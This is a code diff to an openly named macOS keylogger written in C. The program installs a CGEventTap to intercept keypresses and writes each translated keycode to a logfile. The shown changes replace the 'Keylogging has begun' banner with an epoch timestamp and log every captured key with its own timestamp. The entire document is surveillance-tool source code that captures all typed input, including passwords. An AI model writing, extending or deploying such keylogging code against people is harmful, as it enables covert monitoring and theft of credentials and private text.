@@ -1,5 +1,6 @@
 #include "keylogger.h"
 
+
 int main(int argc, const char *argv[]) {
 
     // Create an event tap to retrieve keypresses.
@@ -42,7 +43,7 @@ int main(int argc, const char *argv[]) {
     }
 
     // Output to logfile.
-    fprintf(logfile, "\n\nKeylogging has begun.\n%s\n", asctime(localtime(&result)));
+    fprintf(logfile, "%ld [logging started]\n", result);
     fflush(logfile);
 
     // Display the location of the logfile and start the loop.
@@ -57,11 +58,15 @@ int main(int argc, const char *argv[]) {
 CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
     if (type != kCGEventKeyDown && type != kCGEventFlagsChanged && type != kCGEventKeyUp) { return event; }
 
+    // get the epoch timestamp
+    time_t t = time(NULL);
+
+
     // Retrieve the incoming keycode.
     CGKeyCode keyCode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
 
     // Print the human readable key to the logfile.
-    fprintf(logfile, "%s", convertKeyCode(keyCode));
+    fprintf(logfile, "%ld %s\n", t, convertKeyCode(keyCode));
     fflush(logfile);
 
     return event;
